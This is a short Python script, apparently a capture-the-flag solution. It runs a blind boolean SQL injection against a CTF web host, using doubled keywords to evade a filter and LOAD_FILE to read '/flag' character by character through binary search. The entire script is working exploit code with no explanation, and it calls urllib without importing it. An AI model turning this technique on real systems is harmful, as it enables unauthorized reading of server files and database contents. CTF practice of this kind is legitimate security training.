import requests

url = "http://eci-2zeedsjzsv7gv015g3i4.cloudeci1.ichunqiu.com:80/?id='%20union%20selecSELECTt%201%20%2c2%20WHwhereERE%201%3d1%20"
payload = "and ascii(substr(convert(( LOAD_FILE( '/flag')) using utf8) ,%s,1))>%s # "
flag = ''
for i in range(1, 128):
    max = 126
    min = 33 
    while abs(max-min) > 1:
        mid = int((max+min)/2)
        p = payload % (str(i), str(mid))
        p=urllib.parse.quote(p)
        response = requests.get(url + p)
        str_response= str(response.content, encoding = "utf-8")
        if str_response.find("GET me password") != -1:
            min = mid
        else:
            max = mid
    flag = flag+chr(max)